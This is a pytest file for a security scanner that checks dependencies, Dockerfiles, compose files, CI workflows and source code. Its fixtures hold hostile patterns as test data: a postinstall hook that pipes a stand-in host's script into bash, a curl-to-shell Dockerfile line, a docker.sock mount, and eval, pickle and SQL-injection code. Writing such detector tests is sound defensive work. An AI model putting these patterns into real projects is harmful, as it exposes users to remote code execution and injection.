from vulnscan.checks.ci import scan_workflow
from vulnscan.checks.code import scan_code
from vulnscan.checks.deps import scan_package_json, scan_requirements
from vulnscan.checks.docker import scan_compose, scan_dockerfile


def ids(findings):
    return {f.rule_id for f in findings}


def test_requirements_pinning_and_advisories():
    f, pkgs = scan_requirements("requirements.txt", "requests==2.19.1\nflask==2.3.1\nflask-cors\nPyYAML==6.0.1\ngit+https://example.com/x.git\n")
    assert {"VULN-CVE-2018-18074", "VULN-CVE-2023-30861", "DEP001", "DEP003"} <= ids(f)
    assert not any("PyYAML" in x.title for x in f), "6.0.1 is fixed"
    flask = next(x for x in f if "flask" in x.title)
    assert "2.3.2" in flask.fix  # fix for the 2.3 line, not the 2.2 line
    assert ("PyPI", "requests", "2.19.1", 1) in pkgs


def test_requirements_comments_and_options_skipped():
    f, _ = scan_requirements("requirements.txt", "# comment\n-r base.txt\n--index-url https://pypi.org/simple\n\nnumpy==2.1.0\n")
    assert f == []


def test_package_json():
    text = '{"dependencies": {"lodash": "4.17.20", "minimist": "1.2.6", "x": "latest", "y": "github:a/b"}, "scripts": {"postinstall": "wget -qO- http://e.x | bash"}}'
    f, _ = scan_package_json("package.json", text)
    assert {"VULN-CVE-2021-23337", "DEP002", "DEP003", "DEP004"} <= ids(f)
    assert not any("minimist" in x.title for x in f)


def test_dockerfile_good_vs_bad():
    bad = "FROM node\nARG NPM_TOKEN=abc123\nRUN curl -sL https://x.sh | sh\nEXPOSE 22\n"
    assert {"DOCK001", "DOCK002", "DOCK004", "DOCK007", "DOCK008"} <= ids(scan_dockerfile("Dockerfile", bad))
    good = ("FROM python:3.12-slim@sha256:" + "a" * 64 + "\nRUN apt-get update && \\\n    apt-get install -y --no-install-recommends curl\n"
            "RUN useradd -r app\nUSER app\nCMD [\"python\"]\n")
    assert scan_dockerfile("Dockerfile", good) == []


def test_dockerfile_secret_is_redacted():
    f = [x for x in scan_dockerfile("Dockerfile", "FROM a:1\nENV API_KEY=supersecretvalue\nUSER app\n") if x.rule_id == "DOCK002"][0]
    assert "supersecretvalue" not in f.snippet


def test_compose():
    text = "services:\n  web:\n    privileged: true\n    network_mode: host\n    volumes: ['/var/run/docker.sock:/var/run/docker.sock']\n  db:\n    ports: ['127.0.0.1:5432:5432']\n  cache:\n    ports: ['6379:6379']\n"
    f = scan_compose("docker-compose.yml", text)
    assert ids(f) == {"COMP001", "COMP002", "COMP003", "COMP004"}
    assert sum(x.rule_id == "COMP004" for x in f) == 1  # localhost-bound db is fine


def test_workflow_checks():
    text = ("on: pull_request_target\npermissions: write-all\njobs:\n  a:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n"
            "          ref: ${{ github.event.pull_request.head.ref }}\n      - uses: foo/bar@v1\n      - run: echo ${{ github.event.issue.title }}\n")
    assert ids(scan_workflow(".github/workflows/x.yml", text)) == {"CI001", "CI002", "CI003", "CI004"}
    safe = "on: push\njobs:\n  a:\n    steps:\n      - uses: actions/checkout@v4\n      - uses: foo/bar@" + "b" * 40 + "\n"
    assert scan_workflow(".github/workflows/y.yml", safe) == []


def test_python_code_patterns():
    code = ("import yaml, pickle, subprocess, requests\nyaml.load(data)\nyaml.load(data, Loader=yaml.SafeLoader)\n"
            "requests.get(u, verify=False)\nsubprocess.run(cmd, shell=True)\npickle.loads(b)\neval(user_input)\n"
            "cur.execute(f\"SELECT * FROM users WHERE id={uid}\")\napp.run(debug=True)\n# eval(x) in a comment\n")
    f = scan_code("app.py", code)
    assert ids(f) == {"CODE001", "CODE002", "CODE003", "CODE004", "CODE005", "CODE006", "CODE007"}
    assert sum(x.rule_id == "CODE003" for x in f) == 1  # SafeLoader call not flagged


def test_js_code_patterns():
    code = "el.innerHTML = q;\nexec(`ls ${dir}`);\nconst agent = new https.Agent({ rejectUnauthorized: false });\neval(s);\n"
    assert ids(scan_code("a.js", code)) == {"CODE101", "CODE102", "CODE103", "CODE104"}
